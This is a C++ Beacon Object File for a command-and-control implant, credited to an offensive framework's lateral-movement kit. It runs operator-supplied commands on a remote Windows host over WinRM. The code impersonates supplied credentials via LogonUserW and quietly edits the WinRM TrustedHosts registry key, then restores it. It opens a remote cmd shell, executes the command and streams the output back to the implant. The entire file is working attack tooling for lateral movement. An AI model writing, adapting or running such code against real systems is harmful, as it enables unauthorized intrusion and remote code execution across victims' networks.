/**
 * Credits: https://github.com/Adaptix-Framework/Extension-Kit/blob/main/LateralMovement-BOF/winrm-client/winrm.cpp
 *
 * Explicit creds must be DOMAIN\user (or user@domain). Local accounts must be
 * TARGET\user. WSManCreateShell does the real handshake; CreateSession does not.
 * Default auth is Kerberos and fails without a process TGT (1312 / 0x8009030e).
 */
#include <windows.h>
#define WSMAN_API_VERSION_1_0
#include <wsman.h>

extern "C" {
#include "beacon.h"

WINBASEAPI DWORD  WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI INT    WINAPI MSVCRT$vsnprintf(PCHAR d, size_t n, PCHAR format, va_list arg);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManInitialize(DWORD flags, WSMAN_API_HANDLE *apiHandle);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCreateSession(WSMAN_API_HANDLE apiHandle, PCWSTR connection, DWORD flags, WSMAN_AUTHENTICATION_CREDENTIALS* serverAuthenticationCredentials, WSMAN_PROXY_INFO* proxyInfo, WSMAN_SESSION_HANDLE* session);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManSetSessionOption(WSMAN_SESSION_HANDLE session, WSManSessionOption option, WSMAN_DATA* data);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCreateShell(WSMAN_SESSION_HANDLE session, DWORD flags, PCWSTR resourceUri, WSMAN_SHELL_STARTUP_INFO* startupInfo, WSMAN_OPTION_SET* options, WSMAN_DATA* createXml, WSMAN_SHELL_ASYNC* async, WSMAN_SHELL_HANDLE* shell);
WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD  dwMilliseconds);
WINBASEAPI BOOL   WINAPI KERNEL32$SetEvent(HANDLE hEvent);
WINBASEAPI VOID   WINAPI WsmSvc$WSManRunShellCommand(WSMAN_SHELL_HANDLE shell, DWORD flags, PCWSTR commandLine, WSMAN_COMMAND_ARG_SET* args, WSMAN_OPTION_SET* options, WSMAN_SHELL_ASYNC* async, WSMAN_COMMAND_HANDLE* command);
WINBASEAPI PVOID  WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread(VOID);
WINBASEAPI BOOL   WINAPI KERNEL32$CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
WINBASEAPI BOOL   WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI PWCHAR WINAPI MSVCRT$wcscmp(const wchar_t* _lhs, const wchar_t* _rhs);
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* _Str);
WINBASEAPI INT    WINAPI MSVCRT$swprintf(wchar_t* buffer, const wchar_t* format, ...);
WINBASEAPI VOID   WINAPI WsmSvc$WSManReceiveShellOutput(WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, DWORD flags, WSMAN_STREAM_ID_SET* desiredStreamSet, WSMAN_SHELL_ASYNC* async, WSMAN_OPERATION_HANDLE* receiveOperation);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCloseCommand(WSMAN_COMMAND_HANDLE commandHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
WINBASEAPI VOID   WINAPI WsmSvc$WSManCloseShell(WSMAN_SHELL_HANDLE shellHandle, DWORD flags, WSMAN_SHELL_ASYNC* async);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCloseSession(WSMAN_SESSION_HANDLE session, DWORD flags);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManDeinitialize(WSMAN_API_HANDLE apiHandle, DWORD flags);
WINBASEAPI DWORD  WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI DWORD  WINAPI WsmSvc$WSManCloseOperation(WSMAN_OPERATION_HANDLE operationHandle, DWORD flags);
WINBASEAPI BOOL   WINAPI ADVAPI32$LogonUserW(LPCWSTR, LPCWSTR, LPCWSTR, DWORD, DWORD, PHANDLE);
WINBASEAPI BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINBASEAPI BOOL   WINAPI ADVAPI32$RevertToSelf(VOID);
WINBASEAPI BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, CONST BYTE*, DWORD);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegDeleteValueW(HKEY, LPCWSTR);
WINBASEAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);

#define GetLastError KERNEL32$GetLastError
#define vsnprintf MSVCRT$vsnprintf
#define WSManInitialize WsmSvc$WSManInitialize
#define WSManCreateSession WsmSvc$WSManCreateSession
#define WSManSetSessionOption WsmSvc$WSManSetSessionOption
#define CreateEventW KERNEL32$CreateEventW
#define WSManCreateShell WsmSvc$WSManCreateShell
#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define SetEvent KERNEL32$SetEvent
#define WSManRunShellCommand WsmSvc$WSManRunShellCommand
#define HeapAlloc KERNEL32$HeapAlloc
#define GetProcessHeap KERNEL32$GetProcessHeap
#define GetCurrentThread KERNEL32$GetCurrentThread
#define CreatePipe KERNEL32$CreatePipe
#define WriteFile KERNEL32$WriteFile
#define ReadFile KERNEL32$ReadFile
#define wcscmp MSVCRT$wcscmp
#define wcslen MSVCRT$wcslen
#define swprintf MSVCRT$swprintf
#define WSManReceiveShellOutput WsmSvc$WSManReceiveShellOutput
#define WSManCloseCommand WsmSvc$WSManCloseCommand
#define WSManCloseShell WsmSvc$WSManCloseShell
#define WSManCloseSession WsmSvc$WSManCloseSession
#define WSManDeinitialize WsmSvc$WSManDeinitialize
#define CloseHandle KERNEL32$CloseHandle
#define HeapFree KERNEL32$HeapFree
#define WSManCloseOperation WsmSvc$WSManCloseOperation
#define LogonUserW ADVAPI32$LogonUserW
#define ImpersonateLoggedOnUser ADVAPI32$ImpersonateLoggedOnUser
#define RevertToSelf ADVAPI32$RevertToSelf
#define OpenThreadToken ADVAPI32$OpenThreadToken
#define RegOpenKeyExW ADVAPI32$RegOpenKeyExW
#define RegQueryValueExW ADVAPI32$RegQueryValueExW
#define RegSetValueExW ADVAPI32$RegSetValueExW
#define RegDeleteValueW ADVAPI32$RegDeleteValueW
#define RegCloseKey ADVAPI32$RegCloseKey

#ifndef ERROR_NO_SUCH_LOGON_SESSION
#define ERROR_NO_SUCH_LOGON_SESSION 1312
#endif

    static const WCHAR kTrustedHostsKey[] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Client";
    static const WCHAR kTrustedHostsVal[] = L"TrustedHosts";

    typedef struct  {
        HANDLE event;
        BOOL hadError;
        BOOL commandDone;
        DWORD lastError;
        PCSTR opName;
    } ctxCallback, *PCtxCallback;

    static void ReportWsmanError(PCtxCallback ctx, WSMAN_ERROR* error)
    {
        PCSTR op = (ctx && ctx->opName) ? ctx->opName : "WSMan";
        if (ctx) {
            ctx->hadError = TRUE;
            ctx->lastError = error->code;
        }
        if (error->errorDetail && error->errorDetail[0] != L'\0')
            BeaconPrintf(CALLBACK_ERROR, "error %s: %d (%S)\n", op, error->code, error->errorDetail);
        else
            BeaconPrintf(CALLBACK_ERROR, "error %s: %d\n", op, error->code);

        if (error->code == ERROR_NO_SUCH_LOGON_SESSION)
            BeaconPrintf(CALLBACK_ERROR, "WinRM 1312: no usable logon session. Domain accounts need DOMAIN\\user. Local accounts need TARGET\\user. Current-context Kerberos needs a process TGT.\n");
    }

    static BOOL WaitOp(HANDLE event, DWORD timeoutMs, PCtxCallback ctx, PCSTR opName)
    {
        DWORD wr = WaitForSingleObject(event, timeoutMs);
        if (wr == WAIT_TIMEOUT) {
            BeaconPrintf(CALLBACK_ERROR, "timeout %s after %lu ms\n", opName, timeoutMs);
            if (ctx)
                ctx->hadError = TRUE;
            return FALSE;
        }
        return ctx ? !ctx->hadError : TRUE;
    }

    static void SetDwordOption(WSMAN_SESSION_HANDLE session, WSManSessionOption option, DWORD value)
    {
        WSMAN_DATA data;
        data.type = WSMAN_DATA_TYPE_DWORD;
        data.number = value;
        WSManSetSessionOption(session, option, &data);
    }

    static void ApplySessionOptions(WSMAN_SESSION_HANDLE session, DWORD timeoutMs)
    {
        SetDwordOption(session, WSMAN_OPTION_DEFAULT_OPERATION_TIMEOUTMS, timeoutMs);
        SetDwordOption(session, WSMAN_OPTION_TIMEOUTMS_CREATE_SHELL, timeoutMs);
        /* Do not set UNENCRYPTED_MESSAGES. That requests plaintext HTTP, which
         * the default client policy (AllowUnencrypted=false) rejects with
         * 0x8033811E. Negotiate still message-encrypts over HTTP. */
        SetDwordOption(session, WSMAN_OPTION_ALLOW_NEGOTIATE_IMPLICIT_CREDENTIALS, 1);
    }

    static BOOL HasRealm(PCWSTR s)
    {
        if (!s)
            return FALSE;
        while (*s) {
            if (*s == L'\\' || *s == L'@')
                return TRUE;
            s++;
        }
        return FALSE;
    }

    static PCWSTR FindSlash(PCWSTR s)
    {
        if (!s)
            return NULL;
        while (*s) {
            if (*s == L'\\')
                return s;
            s++;
        }
        return NULL;
    }

    static void CopyWchars(wchar_t* dst, PCWSTR src, SIZE_T n)
    {
        SIZE_T i;
        for (i = 0; i < n; i++)
            dst[i] = src[i];
        dst[n] = L'\0';
    }

    static int WcmpI(PCWSTR a, PCWSTR b)
    {
        while (*a && *b) {
            wchar_t ca = *a++;
            wchar_t cb = *b++;
            if (ca >= L'A' && ca <= L'Z') ca = (wchar_t)(ca + 32);
            if (cb >= L'A' && cb <= L'Z') cb = (wchar_t)(cb + 32);
            if (ca != cb)
                return (int)ca - (int)cb;
        }
        return (int)*a - (int)*b;
    }

    static void ExtractHost(PCWSTR conn, wchar_t* out, SIZE_T cch)
    {
        PCWSTR p = conn;
        SIZE_T i = 0;

        out[0] = L'\0';
        if (!conn || cch < 2)
            return;

        while (*p) {
            if (p[0] == L':' && p[1] == L'/' && p[2] == L'/') {
                p += 3;
                break;
            }
            p++;
        }
        if (!*p)
            p = conn;

        if (*p == L'[') {
            p++;
            while (*p && *p != L']' && i + 1 < cch)
                out[i++] = *p++;
            out[i] = L'\0';
            return;
        }

        while (*p && *p != L':' && *p != L'/' && i + 1 < cch)
            out[i++] = *p++;
        out[i] = L'\0';
    }

    static BOOL HostListContains(PCWSTR list, PCWSTR host)
    {
        wchar_t token[256];
        SIZE_T i;

        if (!list || !host || !host[0])
            return FALSE;

        while (*list) {
            while (*list == L' ' || *list == L'\t' || *list == L',')
                list++;
            if (!*list)
                break;

            i = 0;
            while (*list && *list != L',' && i + 1 < 256)
                token[i++] = *list++;
            while (i > 0 && (token[i - 1] == L' ' || token[i - 1] == L'\t'))
                i--;
            token[i] = L'\0';

            if (token[0] == L'*' && token[1] == L'\0')
                return TRUE;
            if (WcmpI(token, host) == 0)
                return TRUE;
        }
        return FALSE;
    }

    /* Temporarily add host to the WinRM client TrustedHosts list. Required for
     * Negotiate/NTLM to a workgroup host or local account over HTTP. */
    static BOOL EnsureTrustedHost(PCWSTR host, wchar_t** originalOut, BOOL* existedOut, BOOL* modifiedOut)
    {
        HKEY hKey = NULL;
        DWORD type = 0;
        DWORD cb = 0;
        LSTATUS st;
        wchar_t* current = NULL;
        wchar_t* neu = NULL;
        SIZE_T curLen;
        SIZE_T hostLen;
        SIZE_T newLen;
        BOOL ok = FALSE;

        *originalOut = NULL;
        *existedOut = FALSE;
        *modifiedOut = FALSE;

        if (!host || !host[0])
            return TRUE;

        st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, kTrustedHostsKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
        if (st != ERROR_SUCCESS)
            return FALSE;

        st = RegQueryValueExW(hKey, kTrustedHostsVal, NULL, &type, NULL, &cb);
        if (st == ERROR_SUCCESS && cb > 0) {
            current = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + sizeof(wchar_t));
            if (current == NULL) {
                RegCloseKey(hKey);
                return FALSE;
            }
            st = RegQueryValueExW(hKey, kTrustedHostsVal, NULL, &type, (LPBYTE)current, &cb);
            if (st != ERROR_SUCCESS) {
                HeapFree(GetProcessHeap(), 0, current);
                RegCloseKey(hKey);
                return FALSE;
            }
            *existedOut = TRUE;
            if (HostListContains(current, host)) {
                HeapFree(GetProcessHeap(), 0, current);
                RegCloseKey(hKey);
                return TRUE;
            }
        }

        curLen = current ? wcslen(current) : 0;
        hostLen = wcslen(host);
        newLen = curLen ? (curLen + 1 + hostLen) : hostLen;
        neu = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (newLen + 1) * sizeof(wchar_t));
        if (neu == NULL) {
            if (current)
                HeapFree(GetProcessHeap(), 0, current);
            RegCloseKey(hKey);
            return FALSE;
        }

        if (curLen)
            swprintf(neu, L"%s,%s", current, host);
        else
            swprintf(neu, L"%s", host);

        st = RegSetValueExW(hKey, kTrustedHostsVal, 0, REG_SZ, (const BYTE*)neu, (DWORD)((newLen + 1) * sizeof(wchar_t)));
        if (st == ERROR_SUCCESS) {
            *originalOut = current;
            current = NULL;
            *modifiedOut = TRUE;
            ok = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Added %S to WinRM TrustedHosts for this request\n", host);
        }

        HeapFree(GetProcessHeap(), 0, neu);
        if (current)
            HeapFree(GetProcessHeap(), 0, current);
        RegCloseKey(hKey);
        return ok;
    }

    static void RestoreTrustedHosts(wchar_t* original, BOOL existed, BOOL modified)
    {
        HKEY hKey = NULL;

        if (!modified)
            return;

        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, kTrustedHostsKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (existed && original)
                RegSetValueExW(hKey, kTrustedHostsVal, 0, REG_SZ, (const BYTE*)original, (DWORD)((wcslen(original) + 1) * sizeof(wchar_t)));
            else
                RegDeleteValueW(hKey, kTrustedHostsVal);
            RegCloseKey(hKey);
        }
        if (original)
            HeapFree(GetProcessHeap(), 0, original);
    }

    void WSManShellCompletionFunction( PVOID operationContext, DWORD flags, WSMAN_ERROR* error, WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, WSMAN_OPERATION_HANDLE operationHandle, WSMAN_RECEIVE_DATA_RESULT* data )
    {
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManShellCompletionFunction\n");
            return;
        }
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (error && error->code)
            ReportWsmanError(ctxOperation, error);
        SetEvent(ctxOperation->event);
    }

    void ReceiveCallback( PVOID operationContext, DWORD flags, WSMAN_ERROR* error, WSMAN_SHELL_HANDLE shell, WSMAN_COMMAND_HANDLE command, WSMAN_OPERATION_HANDLE operationHandle, WSMAN_RECEIVE_DATA_RESULT* data )
    {
        if (operationContext == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "no context was passed to WSManReceiveShellOutput\n");
            return;
        }
        PCtxCallback ctxOperation = (PCtxCallback)operationContext;
        if (error && 0 != error->code)
            ReportWsmanError(ctxOperation, error);

        if (data && data->streamData.type & WSMAN_DATA_TYPE_BINARY && data->streamData.binaryData.dataLength) {
            DWORD bufferLength = data->streamData.binaryData.dataLength;
            PCHAR buffer = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength + 1);
            if (buffer == NULL) {
                BeaconPrintf(CALLBACK_ERROR, "error HeapAlloc: %d\n", GetLastError());
                return;
            }

            for (DWORD i = 0; i < bufferLength; i++)
                buffer[i] = ((PCHAR)data->streamData.binaryData.data)[i];
            buffer[bufferLength] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);

            if (!HeapFree(GetProcessHeap(), NULL, buffer))
                BeaconPrintf(CALLBACK_ERROR, "error HeapFree: %d\n", GetLastError());
        }

        if (data && data->commandState && wcscmp(data->commandState, WSMAN_COMMAND_STATE_DONE) == 0)
            ctxOperation->commandDone = TRUE;

        if ((error && 0 != error->code) || ctxOperation->commandDone)
            SetEvent(ctxOperation->event);
    }

    void go(char* args, int length) {
        datap parser;
        
        wchar_t* bwusername;
        wchar_t* bwpassword;
        wchar_t* bwdomain;
        wchar_t* bwcommandline;
        wchar_t* bwtarget2;

        bwdomain = L"";
        bwusername = L"";
        bwpassword = L"";

        BeaconDataParse(&parser, args, length);
        {
            bwtarget2 =	(wchar_t*)BeaconDataExtract(&parser, NULL);
            bwcommandline =	(wchar_t*)BeaconDataExtract(&parser, NULL);
            bwdomain =	(wchar_t*)BeaconDataExtract(&parser, NULL);
            bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
            bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
        }

        if (!bwtarget2) bwtarget2 = L"";
        if (!bwcommandline) bwcommandline = L"";
        if (!bwdomain) bwdomain = L"";
        if (!bwusername) bwusername = L"";
        if (!bwpassword) bwpassword = L"";

        HANDLE hEventShellCompl = { 0 };
        HANDLE hEventReceive = { 0 };
        WSMAN_API_HANDLE hApi = { 0 };
        WSMAN_SHELL_HANDLE hShell = { 0 };
        WSMAN_SHELL_ASYNC wsAsync = { 0 };
        WSMAN_SHELL_ASYNC wsAsyncShell = { 0 };
        WSMAN_COMMAND_HANDLE hCmd = { 0 };
        ctxCallback ctxCreateShell = { 0 };
        ctxCallback ctxReceiveShell = { 0 };
        WSMAN_OPERATION_HANDLE receiveOperation = { 0 };

        WSMAN_AUTHENTICATION_CREDENTIALS serverAuthenticationCredentials = { 0 };

        PCWSTR commandLine = bwcommandline;
        PCWSTR connection  = bwtarget2;
        WSMAN_SESSION_HANDLE hSession = { 0 };
        DWORD timeoutMs = 15000;
        DWORD waitResult = WAIT_OBJECT_0;
        BOOL background = FALSE;
        BOOL useExplicit = FALSE;
        BOOL impersonating = FALSE;
        HANDLE hLogonToken = NULL;
        wchar_t* splitDomain = NULL;
        wchar_t domainUser[512];
        wchar_t targetHost[256];
        PCWSTR wsmanUser = NULL;
        PCWSTR logonUser = NULL;
        PCWSTR logonDomain = NULL;
        DWORD ret = NO_ERROR;
        wchar_t* trustedOriginal = NULL;
        BOOL trustedExisted = FALSE;
        BOOL trustedModified = FALSE;

        domainUser[0] = L'\0';
        ExtractHost(connection, targetHost, 256);

        useExplicit = (bwusername[0] != L'\0' && bwpassword[0] != L'\0');
        if (bwusername[0] != L'\0' && bwpassword[0] == L'\0') {
            BeaconPrintf(CALLBACK_ERROR, "Password is required when Username is specified\n");
            return;
        }

        if (useExplicit) {
            logonUser = bwusername;
            logonDomain = (bwdomain[0] != L'\0') ? bwdomain : NULL;

            if (!logonDomain) {
                PCWSTR slash = FindSlash(bwusername);
                if (slash && slash != bwusername) {
                    SIZE_T dlen = (SIZE_T)(slash - bwusername);
                    splitDomain = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (dlen + 1) * sizeof(wchar_t));
                    if (splitDomain == NULL) {
                        BeaconPrintf(CALLBACK_ERROR, "error HeapAlloc: %d\n", GetLastError());
                        return;
                    }
                    CopyWchars(splitDomain, bwusername, dlen);
                    logonDomain = splitDomain;
                    logonUser = slash + 1;
                }
            }

            if (HasRealm(bwusername)) {
                wsmanUser = bwusername;
            } else if (bwdomain[0] != L'\0') {
                swprintf(domainUser, L"%s\\%s", bwdomain, bwusername);
                wsmanUser = domainUser;
            } else if (targetHost[0] != L'\0') {
                /* Unqualified user + no Domain is treated as a local account on the target. */
                swprintf(domainUser, L"%s\\%s", targetHost, bwusername);
                wsmanUser = domainUser;
                if (!logonDomain)
                    logonDomain = targetHost;
                logonUser = bwusername;
                BeaconPrintf(CALLBACK_OUTPUT, "[*] No domain supplied; using local account form %S\n", wsmanUser);
            } else {
                wsmanUser = bwusername;
            }

            if (!LogonUserW(logonUser, logonDomain, bwpassword, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hLogonToken)) {
                BeaconPrintf(CALLBACK_ERROR, "error LogonUserW: %d\n", GetLastError());
                goto done;
            }
            if (!ImpersonateLoggedOnUser(hLogonToken)) {
                BeaconPrintf(CALLBACK_ERROR, "error ImpersonateLoggedOnUser: %d\n", GetLastError());
                goto done;
            }
            impersonating = TRUE;

            serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
            serverAuthenticationCredentials.userAccount.username = wsmanUser;
            serverAuthenticationCredentials.userAccount.password = bwpassword;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using explicit credentials: %S\n", wsmanUser);
        } else {
            HANDLE hTok = NULL;
            /* DEFAULT is Kerberos for remote hosts and fails with 1312/0x8009030e
             * when the process has no TGT. Negotiate can use NTLM implicit creds. */
            serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
            if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hTok)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Thread is impersonating; WinRM authenticates as the process token. \n");
                CloseHandle(hTok);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Using Negotiate with the process token (no explicit credentials)\n");
            }
        }

        if (targetHost[0] != L'\0') {
            if (!EnsureTrustedHost(targetHost, &trustedOriginal, &trustedExisted, &trustedModified))
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not update WinRM TrustedHosts for %S (need HKLM write). Workgroup/local accounts may fail.\n", targetHost);
        }

        ret = WSManInitialize(WSMAN_FLAG_REQUESTED_API_VERSION_1_0, &hApi);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManInitialize: %d\n", ret);
            goto done;
        }

        ret = WSManCreateSession(hApi, connection, 0, &serverAuthenticationCredentials, NULL, &hSession);
        if (ret != NO_ERROR) {
            BeaconPrintf(CALLBACK_ERROR, "error WSManCreateSession: %d\n", ret);
            goto deInitialize;
        }

        ApplySessionOptions(hSession, timeoutMs);

        hEventShellCompl = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (hEventShellCompl == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %d\n", GetLastError());
            goto closeSession;
        }

        ctxCreateShell.event = hEventShellCompl;
        ctxCreateShell.hadError = FALSE;
        ctxCreateShell.lastError = 0;
        ctxCreateShell.opName = "WSManCreateShell";
        wsAsync.operationContext = &ctxCreateShell;
        wsAsync.completionFunction = &WSManShellCompletionFunction;

        WSManCreateShell(hSession, 0, WSMAN_CMDSHELL_URI, NULL, NULL, NULL, &wsAsync, &hShell);
        if (!WaitOp(hEventShellCompl, timeoutMs, &ctxCreateShell, "WSManCreateShell"))
            goto closeShell;

        ctxCreateShell.hadError = FALSE;
        ctxCreateShell.opName = "WSManRunShellCommand";
        WSManRunShellCommand(hShell, 0, commandLine, NULL, NULL, &wsAsync, &hCmd);
        if (!WaitOp(hEventShellCompl, timeoutMs, &ctxCreateShell, "WSManRunShellCommand"))
            goto closeCommand;

        if (background) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] WinRM command launched in background (session kept open)\n");
            goto backgroundDone;
        }

        hEventReceive = CreateEventW(NULL, FALSE, FALSE, NULL);
        if (hEventReceive == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "error CreateEventW: %d\n", GetLastError());
            goto closeCommand;
        }
        ctxReceiveShell.event = hEventReceive;
        ctxReceiveShell.commandDone = FALSE;
        ctxReceiveShell.opName = "WSManReceiveShellOutput";
        wsAsyncShell.operationContext = &ctxReceiveShell;
        wsAsyncShell.completionFunction = &ReceiveCallback;

        WSManReceiveShellOutput(hShell, hCmd, 0, NULL, &wsAsyncShell, &receiveOperation);
        waitResult = WaitForSingleObject(hEventReceive, timeoutMs);
        if (waitResult == WAIT_TIMEOUT) {
            BeaconPrintf(CALLBACK_ERROR, "WinRM receive timeout after %lu ms (command may still be running).\n", timeoutMs);
        }

        if (receiveOperation) {
            ret = WSManCloseOperation(receiveOperation, 0);
            if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManCloseOperation: %ld\n", ret);
        }

        goto closeCommand;

    backgroundDone:
        if (hEventReceive != NULL)
            CloseHandle(hEventReceive);
        if (hEventShellCompl != NULL)
            CloseHandle(hEventShellCompl);
        hEventReceive = NULL;
        hEventShellCompl = NULL;
        goto done;

    closeCommand:
        if (hCmd) {
            ctxCreateShell.hadError = FALSE;
            ctxCreateShell.opName = "WSManCloseCommand";
            WSManCloseCommand(hCmd, 0, &wsAsync);
            WaitForSingleObject(hEventShellCompl, timeoutMs);
        }

    closeShell:
        if (hShell) {
            ctxCreateShell.hadError = FALSE;
            ctxCreateShell.opName = "WSManCloseShell";
            WSManCloseShell(hShell, 0, &wsAsync);
            WaitForSingleObject(hEventShellCompl, timeoutMs);
        }

    closeSession:
        if (hSession) {
            ret = WSManCloseSession(hSession, 0);
            if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManCloseSession: %ld\n", ret);
        }

    deInitialize:
        if (hApi) {
            ret = WSManDeinitialize(hApi, 0);
            if (ret != NO_ERROR) BeaconPrintf(CALLBACK_ERROR, "error WSManDeinitialize: %ld\n", ret);
        }

        if (hEventReceive != NULL)
            CloseHandle(hEventReceive);
        if (hEventShellCompl != NULL)
            CloseHandle(hEventShellCompl);

    done:
        RestoreTrustedHosts(trustedOriginal, trustedExisted, trustedModified);
        if (impersonating)
            RevertToSelf();
        if (hLogonToken)
            CloseHandle(hLogonToken);
        if (splitDomain)
            HeapFree(GetProcessHeap(), 0, splitDomain);
    }
}
